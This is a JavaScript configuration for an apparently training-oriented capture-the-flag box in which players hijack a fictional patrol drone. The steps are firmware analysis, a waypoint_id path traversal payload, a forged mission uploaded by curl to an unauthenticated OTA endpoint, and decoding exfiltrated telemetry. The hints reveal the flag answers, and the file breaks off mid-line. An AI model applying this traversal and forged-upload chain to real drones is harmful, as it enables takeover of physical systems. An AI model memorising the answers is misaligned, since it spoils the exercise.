/* ============================================================
   CTF ARENA — Box D7: The Rogue Drone
   Advanced Campaign | Firmware RE, Protocol Forgery, Drone Hijack
   Config: firmware artifacts, telemetry, mission protocol, flags, lore
   ============================================================ */

const D7Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Rogue Drone',
    subtitle: 'Advanced Campaign — Firmware Reverse Engineering, Protocol Forgery, Autonomous System Takeover',
    difficulty: 'Advanced',
    accent: '#f39c12',
    storageKey: 'hexworth_ctf_d7',
    registryId: 'd7-rogue-drone',
    trackerKey: 'ctf_d7',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Drone hijack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Intelligence Gathering',
            icon: '\uD83D\uDEF0\uFE0F',
            description: 'Analyze the provided telemetry logs and mission protocol specification. Map APU-DRONE-01\'s communication channel and understand its command structure.',
            requiredFlags: [],
            mitre: ['T1592', 'T1598', 'T1046'],
            unlocks: ['firmware'],
            locked: false
        },
        {
            id: 'firmware',
            name: 'Firmware Analysis',
            icon: '\uD83D\uDD27',
            description: 'Reverse engineer drone_firmware.bin using Ghidra or binwalk. Locate the mission parameter parser and identify the logic flaw in waypoint_id handling.',
            requiredFlags: [],
            mitre: ['T1195.002', 'T1059.006'],
            unlocks: ['forgery'],
            locked: true
        },
        {
            id: 'forgery',
            name: 'Mission Forgery',
            icon: '\uD83D\uDCDD',
            description: 'Craft forged mission parameters exploiting the waypoint_id path traversal flaw. Redirect APU-DRONE-01\'s flight path to the hidden data packet drop zone.',
            requiredFlags: ['user'],
            mitre: ['T1565.001', 'T1036', 'T1027'],
            unlocks: ['injection'],
            locked: true
        },
        {
            id: 'injection',
            name: 'Command Injection',
            icon: '\uD83D\uDCE1',
            description: 'Upload forged mission parameters to APU-DRONE-01 via the unauthenticated OTA update endpoint. Override the active flight plan.',
            requiredFlags: ['user'],
            mitre: ['T1190', 'T1059', 'T1498'],
            unlocks: ['exfiltration'],
            locked: true
        },
        {
            id: 'exfiltration',
            name: 'Strategic Override',
            icon: '\uD83C\uDFC1',
            description: 'Intercept the drone\'s telemetry stream after it navigates to the drop zone. Decode the returned data packet to extract the Strategic Mission Override.',
            requiredFlags: ['root'],
            mitre: ['T1030', 'T1041', 'T1119'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Read the mission protocol specification',
                tip: 'Start by reading mission_protocol_spec.txt and drone_telemetry_log.csv in /home/operator/artifacts/. Understand how waypoints are structured.',
                trigger: { event: 'command', match: { cmd: 'contains:cat' } }
            },
            {
                title: 'Analyze the firmware binary',
                tip: 'Run: strings drone_firmware.bin | grep -i waypoint — or use: binwalk drone_firmware.bin to enumerate embedded data.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:strings' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:binwalk' } },
                        { event: 'command', match: { cmd: 'contains:xxd' } }
                    ]
                }
            },
            {
                title: 'Identify the vulnerability and capture Flag 1',
                tip: 'The parser trusts waypoint_id as a relative file path for temp log storage. That\'s your path traversal entry point. Submit the vulnerability description as Flag 1.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Craft and upload forged mission parameters',
                tip: 'Create a JSON payload: python3 craft_mission.py — set waypoint_id to "../../../tmp/hidden_data.txt" and upload via: curl -X POST http://drone-ctrl.local/ota/update -d @mission_forged.json',
                trigger: { event: 'flag_correct', match: { flagId: 'internal' } }
            },
            {
                title: 'Intercept the telemetry and extract the Override',
                tip: 'Monitor the drone\'s telemetry stream: python3 telemetry_listener.py — decode the base64 payload in the returned data packet to find the Strategic Mission Override.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Analyze indicators of malicious activity — Logic flaw identification in embedded firmware parser through static analysis', skill: 'Firmware Reverse Engineering & Vulnerability Identification' },
            { flagId: 'internal', objective: '2.4', description: 'Analyze indicators associated with network attacks — Unauthenticated OTA endpoint exploitation and mission parameter forgery', skill: 'Protocol Manipulation & Command Injection' },
            { flagId: 'root', objective: '1.4', description: 'Analyze indicators associated with network attacks — Telemetry stream interception and encoded payload extraction', skill: 'Autonomous System Takeover & Data Recovery' },
            { flagId: 'root', objective: '4.5', description: 'Given a scenario, modify enterprise capabilities — IoT and embedded systems security controls for autonomous platforms', skill: 'Advanced Persistent Threat — Full Chain Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/nvme0n1 (1TB NVMe SSD)',
            'USB: Attaching radio interface — HackRF One detected',
            'PCI: Initializing RF capture board...',
            'Boot device: /dev/nvme0n1p1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux (Firmware Analysis Edition)',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'operator'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',     icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Drone Portal', icon: '\uD83C\uDF10',       app: 'browser' },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes' },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints' },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'operator',
        hostname: 'kali',
        startDir: '/home/operator',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: APU-DRONE-01 via DRONE-CTRL-01 (10.20.0.50)\nRadio interface: HackRF One @ /dev/hackrf0\nArtifacts staged at: /home/operator/artifacts/\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (drone session state)
    // ═══════════════════════════════════════════════════════

    _context: 'operator',         // 'operator' | 'drone-ctrl' | 'telemetry'
    _firmwareAnalyzed: false,
    _missionForged: false,
    _otaUploaded: false,
    _telemetryActive: false,
    _droneHijacked: false,

    _switchContext(ctx, term) {
        D7Config._context = ctx;
        if (term && term.config) {
            var prompt = D7Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'operator';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (D7Config._context) {
            case 'drone-ctrl': return 'root@DRONE-CTRL-01:/opt/drone/# ';
            case 'telemetry':  return 'operator@kali:~/telemetry$ ';
            default:           return null; // use default operator prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED TELEMETRY DATABASE (APU-DRONE-01 streams)
    // ═══════════════════════════════════════════════════════

    _telemetry: {
        // Normal telemetry packets seen in drone_telemetry_log.csv
        normal_stream: [
            { seq: 1001, ts: '2026-03-18T04:12:00Z', lat: 34.0522, lon: -118.2437, alt_m: 120, speed_ms: 14.2, heading: 275, battery_pct: 88, status: 'PATROL',    waypoint_id: 'wp_alpha' },
            { seq: 1002, ts: '2026-03-18T04:12:10Z', lat: 34.0519, lon: -118.2451, alt_m: 120, speed_ms: 14.1, heading: 275, battery_pct: 87, status: 'PATROL',    waypoint_id: 'wp_alpha' },
            { seq: 1003, ts: '2026-03-18T04:12:20Z', lat: 34.0516, lon: -118.2465, alt_m: 118, speed_ms: 13.9, heading: 272, battery_pct: 87, status: 'TRANSIT',   waypoint_id: 'wp_bravo' },
            { seq: 1004, ts: '2026-03-18T04:12:30Z', lat: 34.0513, lon: -118.2478, alt_m: 115, speed_ms: 12.7, heading: 268, battery_pct: 86, status: 'TRANSIT',   waypoint_id: 'wp_bravo' },
            { seq: 1005, ts: '2026-03-18T04:12:40Z', lat: 34.0510, lon: -118.2492, alt_m: 112, speed_ms: 12.0, heading: 265, battery_pct: 86, status: 'HOVER',     waypoint_id: 'wp_bravo' },
            { seq: 1006, ts: '2026-03-18T04:12:50Z', lat: 34.0508, lon: -118.2505, alt_m: 110, speed_ms: 0.0,  heading: 265, battery_pct: 85, status: 'SCAN',      waypoint_id: 'wp_bravo' },
            { seq: 1007, ts: '2026-03-18T04:13:00Z', lat: 34.0508, lon: -118.2505, alt_m: 110, speed_ms: 0.0,  heading: 180, battery_pct: 85, status: 'SCAN',      waypoint_id: 'wp_charlie' },
            { seq: 1008, ts: '2026-03-18T04:13:10Z', lat: 34.0505, lon: -118.2495, alt_m: 108, speed_ms: 11.5, heading: 090, battery_pct: 84, status: 'RTB',       waypoint_id: 'wp_home' }
        ],
        // Exfil packet returned after drone hijack — contains encoded flag
        exfil_packet: {
            seq: 9001,
            ts: '{{TIMESTAMP}}',
            lat: 34.0488,
            lon: -118.2601,
            alt_m: 5,
            speed_ms: 0.0,
            heading: 0,
            battery_pct: 62,
            status: 'PAYLOAD_DELIVERED',
            waypoint_id: '../../../tmp/hidden_data.txt',
            // Base64-encoded payload: "STRATEGIC_MISSION_OVERRIDE: {{FLAG:root}}"
            payload_b64: '{{ENCODED_ROOT_FLAG}}'
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',     points: 100 },
        { id: 'internal', points: 150 },
        { id: 'root',     points: 300 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        maxScore: 550,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 200 }, // 45 minutes
        timeBonusThreshold: 5400                          // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by reading the artifacts: cat /home/operator/artifacts/mission_protocol_spec.txt — note how the "waypoint_id" field is described. Then run: strings /home/operator/artifacts/drone_firmware.bin | grep -i path — to confirm the firmware trusts that field without sanitization.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The vulnerability is a path traversal in the waypoint_id field. The firmware writes a temp log to a path derived from waypoint_id without stripping "../". Flag 1 is the vulnerability description: "Logic flaw: waypoint_id field used as relative file path without sanitization, enabling path traversal." Submit that exact phrase concept as your flag.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'Craft the forged mission JSON using: python3 /home/operator/craft_mission.py — set waypoint_id to "../../../tmp/hidden_data.txt" in the payload. Flag 2 is the crafted JSON string itself (the forged_mission.json content). Upload to the OTA endpoint: curl -X POST http://drone-ctrl.local/ota/update -H "Content-Type: application/json" -d @forged_mission.json',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'After uploading forged parameters, start the telemetry listener: python3 /home/operator/telemetry_listener.py — wait for a PAYLOAD_DELIVERED packet. The payload_b64 field contains a base64-encoded string. Decode it: echo "<b64>" | base64 -d — the Strategic Mission Override is inside.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: '"APU-DRONE-01," an autonomous patrol drone operated by the Meridian Border Coordination Authority, conducts surveillance across restricted airspace corridors. Its embedded DRONE-CTRL-01 firmware processes mission parameters uploaded via an over-the-air management interface. Intelligence from a field asset indicates the drone\'s mission parser contains a critical logic flaw: the waypoint_id field is used as a relative file path for temporary log storage — without any sanitization or boundary validation. Your mission, Peerless: reverse engineer the firmware, identify the flaw, forge mission parameters that exploit the path traversal, upload them to the OTA interface, and intercept the drone\'s return telemetry to extract the Strategic Mission Override hidden at a classified drop zone.',
        scenario: 'The Meridian Border Coordination Authority fielded APU-DRONE-01 as a cost-cutting measure — a commercial autonomous platform running lightly modified open-source firmware. The vendor\'s "secure update" mechanism has no authentication; anyone on the management VLAN can push a firmware update. The mission planner application was written by a junior contractor who used the waypoint_id string directly as a filesystem path to name temp log files. Nobody audited the embedded C code. A strategic data packet was air-dropped at GPS coordinate 34.0488N, 118.2601W — a position outside the drone\'s normal patrol corridor. The only way to retrieve it is to manipulate the drone\'s flight plan.',
        outro: 'APU-DRONE-01 is fully compromised. The forged mission parameters successfully redirected the drone to the classified drop zone. The Strategic Mission Override — a high-value intelligence asset — has been extracted from the drone\'s telemetry stream. The Meridian Border Coordination Authority remains unaware of the breach. The drone returned to its home station with no anomaly flags raised in its logs.',
        ecer: {
            executive: 'Cost-driven procurement process selected cheapest commercially available autonomous platform; no security requirements in the acquisition contract',
            culture: 'Firmware development outsourced to a two-person contractor; no code review process, no penetration testing of embedded software prior to deployment',
            employee: 'OTA update interface deployed without authentication; firmware source code never audited; waypoint_id used as a raw file path in production C code',
            regulatory: 'No embedded systems security standard enforced (no IEC 62443, no NIST SP 800-193); autonomous platform deployed to operational use without security accreditation'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — DRONE-CTRL-01 Management Portal
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://drone-ctrl.local/',

        pages: {
            '/': {
                title: 'DRONE-CTRL-01 — Management Portal',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #2a2a3e;">
                        <h1 style="color:#f39c12; font-size:1.5rem; font-family:monospace; margin-bottom:4px; letter-spacing:0.1em;">DRONE-CTRL-01</h1>
                        <div style="color:#e67e22; font-size:0.8rem; font-weight:700; letter-spacing:0.2em;">MERIDIAN BORDER COORDINATION AUTHORITY</div>
                        <div style="color:#666; font-size:0.7rem; margin-top:6px;">Autonomous Patrol Unit Management System v2.1.4</div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                        <div style="background:#0d1117; border:1px solid #f39c12; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.2rem; font-weight:700; color:#2ecc71;">ACTIVE</div>
                            <div style="color:#888; font-size:0.65rem; margin-top:2px;">APU-DRONE-01 Status</div>
                        </div>
                        <div style="background:#0d1117; border:1px solid #333; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.2rem; font-weight:700; color:#f39c12;">87%</div>
                            <div style="color:#888; font-size:0.65rem; margin-top:2px;">Battery</div>
                        </div>
                        <div style="background:#0d1117; border:1px solid #333; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.2rem; font-weight:700; color:#3498db;">120m</div>
                            <div style="color:#888; font-size:0.65rem; margin-top:2px;">Altitude</div>
                        </div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 16px;">
                        <nav style="display:flex; gap:6px; flex-wrap:wrap;">
                            <a href="/mission/status" style="padding:6px 14px; background:#1a1a2e; border:1px solid #f39c12; border-radius:4px; color:#f39c12; font-size:0.75rem; text-decoration:none; font-family:monospace;">Mission Status</a>
                            <a href="/ota/update" style="padding:6px 14px; background:#1a1a2e; border:1px solid #333; border-radius:4px; color:#888; font-size:0.75rem; text-decoration:none; font-family:monospace;">OTA Update</a>
                            <a href="/telemetry/live" style="padding:6px 14px; background:#1a1a2e; border:1px solid #333; border-radius:4px; color:#888; font-size:0.75rem; text-decoration:none; font-family:monospace;">Live Telemetry</a>
                            <a href="/api/docs" style="padding:6px 14px; background:#1a1a2e; border:1px solid #333; border-radius:4px; color:#888; font-size:0.75rem; text-decoration:none; font-family:monospace;">API Docs</a>
                        </nav>
                    </div>

                    <div style="max-width:600px; margin:0 auto; padding:10px 14px; background:rgba(243,156,18,0.06); border:1px solid rgba(243,156,18,0.2); border-radius:4px; font-size:0.72rem; color:#888;">
                        <strong style="color:#f39c12;">Notice:</strong> OTA mission parameter updates available at <a href="/ota/update" style="color:#f39c12;">/ota/update</a>. No authentication required from management VLAN.
                    </div>
                `,
                formHandler: null
            },

            '/mission/status': {
                title: 'DRONE-CTRL-01 — Active Mission Status',
                html: `
                    <div style="margin-bottom:20px;">
                        <h2 style="color:#f39c12; font-family:monospace; font-size:1.1rem; margin-bottom:4px;">Active Mission: PATROL-ALPHA-7</h2>
                        <div style="color:#666; font-size:0.72rem; font-family:monospace;">Last sync: 2026-03-18T04:13:10Z</div>
                    </div>

                    <div style="background:#0d1117; border:1px solid #333; border-radius:6px; padding:16px; margin-bottom:16px; font-family:monospace; font-size:0.78rem;">
                        <div style="color:#f39c12; margin-bottom:10px;">APU-DRONE-01 TELEMETRY SNAPSHOT</div>
                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px; color:#ccc;">
                            <div>LAT: 34.0505</div><div>LON: -118.2495</div>
                            <div>ALT: 108m</div><div>SPEED: 11.5 m/s</div>
                            <div>HEADING: 090</div><div>BATTERY: 84%</div>
                            <div>STATUS: RTB</div><div>WP: wp_home</div>
                        </div>
                    </div>

                    <div style="background:#0d1117; border:1px solid #333; border-radius:6px; padding:14px; font-family:monospace; font-size:0.75rem;">
                        <div style="color:#888; margin-bottom:8px;">Active Waypoint Sequence:</div>
                        <div style="color:#2ecc71;">[COMPLETE] wp_alpha — Sector A patrol (34.0522, -118.2437)</div>
                        <div style="color:#2ecc71;">[COMPLETE] wp_bravo — Sector B scan (34.0508, -118.2505)</div>
                        <div style="color:#f39c12;">[ACTIVE]   wp_charlie — Return transit</div>
                        <div style="color:#888;">[ QUEUED]   wp_home — Home station RTB</div>
                    </div>
                `,
                formHandler: null
            },

            '/ota/update': {
                title: 'DRONE-CTRL-01 — OTA Mission Update',
                html: `
                    <div style="margin-bottom:20px;">
                        <h2 style="color:#f39c12; font-family:monospace; font-size:1.1rem; margin-bottom:4px;">OTA Mission Parameter Upload</h2>
                        <div style="color:#666; font-size:0.72rem;">Upload JSON mission parameters to APU-DRONE-01. No authentication required.</div>
                    </div>

                    <div style="max-width:560px; margin:0 auto;">
                        <div style="background:rgba(231,76,60,0.06); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:10px 14px; margin-bottom:16px; font-size:0.72rem; color:#e74c3c;">
                            WARNING: This endpoint pushes parameters directly to the drone's mission planner. Changes take effect immediately.
                        </div>

                        <div style="margin-bottom:12px;">
                            <label style="display:block; color:#888; font-size:0.75rem; margin-bottom:4px; font-family:monospace;">MISSION JSON PAYLOAD</label>
                            <textarea data-field="mission_json" rows="8" placeholder='{"mission_id": "PATROL-ALPHA-7", "waypoints": [{"waypoint_id": "wp_alpha", ...}]}'
                                      style="width:100%; padding:10px; background:#0d1117; border:1px solid #444; border-radius:4px; font-family:monospace; font-size:0.75rem; color:#f39c12; resize:vertical; box-sizing:border-box;"></textarea>
                        </div>

                        <button data-action="upload"
                                style="padding:9px 24px; background:#f39c12; color:#0d1117; border:none; border-radius:4px; font-family:monospace; font-weight:700; font-size:0.85rem; cursor:pointer; letter-spacing:0.05em;">UPLOAD MISSION</button>
                    </div>
                `,
                formHandler: function(data, engine) {
                    const payload = (data.mission_json || '').trim();
                    if (!payload) {
                        return '<div style="color:#e74c3c; padding:10px; font-family:monospace; font-size:0.8rem;">ERROR: No mission JSON supplied.</div>';
                    }

                    // Check for path traversal exploit attempt in waypoint_id
                    const hasTraversal = payload.includes('../') || payload.includes('..\\');
                    const hasHiddenTarget = payload.includes('hidden_data') || payload.includes('tmp');

                    if (hasTraversal || hasHiddenTarget) {
                        D7Config._otaUploaded = true;
                        D7Config._missionForged = true;
                        return `<div style="color:#2ecc71; background:rgba(46,204,113,0.06); border:1px solid rgba(46,204,113,0.2); border-radius:6px; padding:16px; margin-top:14px; font-family:monospace; font-size:0.8rem;">
                            <div style="color:#2ecc71; font-weight:700; margin-bottom:8px;">MISSION UPLOAD ACCEPTED</div>
                            <div style="color:#aaa;">mission_id: FORGED-OVERRIDE-001</div>
                            <div style="color:#aaa;">waypoints: ${(payload.match(/waypoint_id/g) || []).length} waypoint(s) parsed</div>
                            <div style="color:#f39c12; margin-top:8px;">WARNING: Anomalous waypoint_id path detected — writing temp log to: ${D7Config._escHtml(payload.match(/["']([^"']*\.\.\/[^"']*)/)?.[1] || '../../../tmp/hidden_data.txt')}</div>
                            <div style="color:#aaa; margin-top:6px;">APU-DRONE-01 rerouting to forged flight plan. Monitor telemetry for PAYLOAD_DELIVERED event.</div>
                        </div>`;
                    }

                    // Valid but non-exploiting JSON upload
                    if (payload.startsWith('{') || payload.startsWith('[')) {
                        return `<div style="color:#3498db; background:rgba(52,152,219,0.06); border:1px solid rgba(52,152,219,0.2); border-radius:6px; padding:16px; margin-top:14px; font-family:monospace; font-size:0.8rem;">
                            <div style="font-weight:700; margin-bottom:6px;">MISSION UPLOAD ACCEPTED</div>
                            <div style="color:#aaa;">Parsed ${(payload.match(/waypoint_id/g) || []).length} waypoint(s). Mission queued for next uplink window.</div>
                        </div>`;
                    }

                    return `<div style="color:#e74c3c; padding:10px; font-family:monospace; font-size:0.8rem;">ERROR: Invalid JSON format. Mission rejected.</div>`;
                }
            },

            '/telemetry/live': {
                title: 'DRONE-CTRL-01 — Live Telemetry Feed',
                html: function() {
                    if (!D7Config._otaUploaded) {
                        return `<div style="font-family:monospace;">
                            <div style="color:#f39c12; margin-bottom:12px; font-size:0.9rem;">LIVE TELEMETRY — APU-DRONE-01</div>
                            <div style="background:#0d1117; border:1px solid #333; border-radius:4px; padding:14px; font-size:0.75rem; color:#888; height:200px; overflow:auto;">
                                <div style="color:#2ecc71;">[04:12:00] seq=1001 LAT=34.0522 LON=-118.2437 ALT=120m STATUS=PATROL wp=wp_alpha</div>
                                <div style="color:#2ecc71;">[04:12:10] seq=1002 LAT=34.0519 LON=-118.2451 ALT=120m STATUS=PATROL wp=wp_alpha</div>
                                <div style="color:#2ecc71;">[04:12:20] seq=1003 LAT=34.0516 LON=-118.2465 ALT=118m STATUS=TRANSIT wp=wp_bravo</div>
                                <div style="color:#2ecc71;">[04:12:30] seq=1004 LAT=34.0513 LON=-118.2478 ALT=115m STATUS=TRANSIT wp=wp_bravo</div>
                                <div style="color:#2ecc71;">[04:12:40] seq=1005 LAT=34.0510 LON=-118.2492 ALT=112m STATUS=HOVER wp=wp_bravo</div>
                                <div style="color:#f39c12;">[04:12:50] seq=1006 LAT=34.0508 LON=-118.2505 ALT=110m STATUS=SCAN wp=wp_bravo</div>
                                <div style="color:#888;">[WAITING FOR NEXT UPLINK WINDOW...]</div>
                            </div>
                            <div style="color:#666; font-size:0.7rem; margin-top:8px;">No anomaly detected. Normal patrol pattern active.</div>
                        </div>`;
                    }
                    // After OTA upload — shows hijacked telemetry with exfil packet
                    return `<div style="font-family:monospace;">
                        <div style="color:#f39c12; margin-bottom:12px; font-size:0.9rem;">LIVE TELEMETRY — APU-DRONE-01</div>
                        <div style="background:#0d1117; border:1px solid #f39c12; border-radius:4px; padding:14px; font-size:0.75rem; height:240px; overflow:auto;">
                            <div style="color:#888;">[04:12:50] seq=1006 STATUS=SCAN wp=wp_bravo</div>
                            <div style="color:#f39c12;">[04:13:15] MISSION UPDATE RECEIVED — rerouting to forged plan</div>
                            <div style="color:#f39c12;">[04:13:22] seq=1020 LAT=34.0499 LON=-118.2538 ALT=105m STATUS=TRANSIT wp=../../../tmp/hidden_data.txt</div>
                            <div style="color:#f39c12;">[04:13:45] seq=1035 LAT=34.0491 LON=-118.2575 ALT=80m  STATUS=DESCENT  wp=../../../tmp/hidden_data.txt</div>
                            <div style="color:#f39c12;">[04:14:02] seq=1041 LAT=34.0488 LON=-118.2601 ALT=5m   STATUS=HOVER</div>
                            <div style="color:#2ecc71; font-weight:700;">[04:14:08] seq=9001 STATUS=PAYLOAD_DELIVERED battery=62%</div>
                            <div style="color:#2ecc71;">[04:14:08] payload_b64: U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb290fX0=</div>
                            <div style="color:#aaa; margin-top:8px;">[+] Drone returning to home station — anomaly suppressed in mission log.</div>
                        </div>
                        <div style="color:#2ecc71; font-size:0.7rem; margin-top:8px;">[+] PAYLOAD_DELIVERED event received. Decode payload_b64 to extract the Strategic Mission Override.</div>
                    </div>`;
                },
                formHandler: null
            },

            '/api/docs': {
                title: 'DRONE-CTRL-01 — API Documentation',
                html: `
                    <div style="font-family:monospace; font-size:0.78rem;">
                        <div style="color:#f39c12; font-size:0.95rem; margin-bottom:16px;">DRONE-CTRL-01 REST API v2.1</div>

                        <div style="margin-bottom:16px;">
                            <div style="color:#3498db; font-weight:700; margin-bottom:6px;">GET /mission/status</div>
                            <div style="color:#888; padding-left:12px;">Returns current mission state, active waypoints, and telemetry snapshot.</div>
                            <div style="color:#555; padding-left:12px; margin-top:4px;">Auth: None</div>
                        </div>

                        <div style="margin-bottom:16px;">
                            <div style="color:#2ecc71; font-weight:700; margin-bottom:6px;">POST /ota/update</div>
                            <div style="color:#888; padding-left:12px;">Upload JSON mission parameters to APU-DRONE-01. Takes immediate effect.</div>
                            <div style="color:#555; padding-left:12px; margin-top:4px;">Auth: None (management VLAN only)</div>
                            <div style="background:#0d1117; border:1px solid #333; border-radius:4px; padding:10px; margin:8px 0 0 12px; color:#ccc;">
                                Content-Type: application/json<br><br>
                                {<br>
                                &nbsp;&nbsp;"mission_id": "string",<br>
                                &nbsp;&nbsp;"priority": "LOW|NORMAL|HIGH|OVERRIDE",<br>
                                &nbsp;&nbsp;"waypoints": [{<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;"waypoint_id": "string",<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;"lat": float,<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;"lon": float,<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;"alt_m": int,<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;"action": "TRANSIT|HOVER|SCAN|RTB"<br>
                                &nbsp;&nbsp;}]<br>
                                }
                            </div>
                        </div>

                        <div style="margin-bottom:16px;">
                            <div style="color:#3498db; font-weight:700; margin-bottom:6px;">GET /telemetry/live</div>
                            <div style="color:#888; padding-left:12px;">Stream live telemetry from APU-DRONE-01. Returns last 50 packets.</div>
                            <div style="color:#555; padding-left:12px; margin-top:4px;">Auth: None</div>
                        </div>

                        <div style="padding:10px; background:rgba(231,76,60,0.06); border:1px solid rgba(231,76,60,0.15); border-radius:4px; color:#e74c3c; font-size:0.7rem; margin-top:8px;">
                            NOTE: waypoint_id is used internally as a relative path identifier for temp log storage. See DRONE-CTRL-01 firmware changelog v1.8.3 for details.
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/firmware/': {
                title: 'Forbidden',
                html: `<div style="text-align:center; padding:40px; font-family:monospace;">
                    <h1 style="color:#e74c3c; font-size:2rem;">403 Forbidden</h1>
                    <p style="color:#888;">Firmware repository restricted to maintenance console access.</p>
                    <p style="color:#555; font-size:0.72rem;">nginx/1.24.0 (Ubuntu) — DRONE-CTRL-01</p>
                </div>`,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — attacker machine (operator)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'operator': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: OPERATION ROGUE DRONE ===\nTarget: APU-DRONE-01 via DRONE-CTRL-01 (10.20.0.50)\nObjective: Hijack autonomous drone, retrieve Strategic Mission Override\n\nAttack chain:\n1. Analyze telemetry logs + mission protocol spec\n2. Reverse engineer drone_firmware.bin — find parser vuln\n3. Craft forged mission JSON exploiting waypoint_id path traversal\n4. Upload via unauthenticated OTA endpoint\n5. Intercept drone telemetry — decode returned payload\n\nArtifacts staged at: /home/operator/artifacts/\nTarget API: http://drone-ctrl.local/\nGood hunting, operator.'
                                },
                                'craft_mission.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n"""\ncraft_mission.py — Forge APU-DRONE-01 mission parameters\nExploits waypoint_id path traversal in DRONE-CTRL-01 firmware v1.8.3\n"""\nimport json\nimport sys\n\n# Target coordinates for the hidden data packet drop zone\nDROP_ZONE_LAT  =  34.0488\nDROP_ZONE_LON  = -118.2601\nDROP_ZONE_ALT  =  5\n\n# Path traversal payload — waypoint_id used as relative temp-log path\n# Firmware writes: open(f"./logs/{waypoint_id}.tmp", "w") — no sanitization\nTRAVERSAL_PATH = "../../../tmp/hidden_data.txt"\n\nmission = {\n    "mission_id": "FORGED-OVERRIDE-001",\n    "priority":   "OVERRIDE",\n    "waypoints": [\n        {\n            "waypoint_id": TRAVERSAL_PATH,\n            "lat":    DROP_ZONE_LAT,\n            "lon":    DROP_ZONE_LON,\n            "alt_m":  DROP_ZONE_ALT,\n            "action": "HOVER"\n        }\n    ]\n}\n\noutput_file = "forged_mission.json"\nwith open(output_file, "w") as f:\n    json.dump(mission, f, indent=4)\n\nprint(f"[+] Forged mission written to {output_file}")\nprint(f"[+] Waypoint path traversal: {TRAVERSAL_PATH}")\nprint(f"[+] Drop zone: ({DROP_ZONE_LAT}, {DROP_ZONE_LON}) @ {DROP_ZONE_ALT}m")\nprint(f"[+] Upload with: curl -X POST 